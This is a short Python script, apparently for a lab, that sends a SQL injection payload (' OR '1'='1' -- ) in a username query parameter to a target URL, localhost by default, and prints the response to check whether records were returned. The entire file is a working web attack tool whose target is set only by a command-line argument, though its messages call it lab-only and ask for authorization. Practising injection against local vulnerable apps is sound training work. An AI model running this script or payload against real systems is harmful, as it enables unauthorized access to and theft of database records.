#!/usr/bin/env python3
"""
exploit.py â€” Demonstrate SQL injection against local vulnerable app.

Usage:
  python3 exploit.py --url http://localhost:8080/ --payload "' OR '1'='1' -- "
"""

import argparse
import requests
from urllib.parse import urljoin

def run_attack(base_url, payload):
    params = {'username': payload}
    r = requests.get(base_url, params=params, timeout=10)
    print(f"[HTTP {r.status_code}] Request: {r.url}\n")
    # naive extraction: print snippet of body to show results
    body = r.text
    snippet = body[:2000]  # first 2000 chars
    print(snippet)
    if "No users found" in body:
        print("\n[+] The injection did not return records.")
    else:
        print("\n[+] The injection likely returned data. Check the response table in HTML above.")

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", default="http://localhost:8080/", help="Target URL (local only)")
    p.add_argument("--payload", default="' OR '1'='1' -- ", help="SQL injection payload")
    args = p.parse_args()
    print("[*] Running SQLi test (lab-only). Make sure target is local and authorized.")
    run_attack(args.url, args.payload)

if __name__ == "__main__":
    main()
